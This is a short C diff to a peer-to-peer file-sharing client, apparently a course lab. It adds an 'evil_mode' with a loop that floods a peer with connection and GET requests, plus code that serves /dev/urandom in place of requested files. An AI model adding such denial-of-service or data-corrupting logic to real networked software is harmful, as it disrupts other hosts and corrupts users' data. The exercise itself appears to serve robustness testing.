@@ -557,6 +557,17 @@ static void task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 
+  // DDOS attack, minus the D
+  if (evil_mode) {
+    while(1) {
+      t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+      if (t->peer_fd == -1) {
+        goto try_again;
+      }
+      osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+    }
+  }
+
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -716,6 +727,11 @@ static void task_upload(task_t *t)
 		error("* Error: Peer requested file from invalid directory\n");
 		goto exit;
 	}
+
+  // copy pseudorandom data over because who needs it
+  if (evil_mode) {
+    strncpy(t->filename, "/dev/urandom", FILENAMESIZ);
+  }
 
 	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
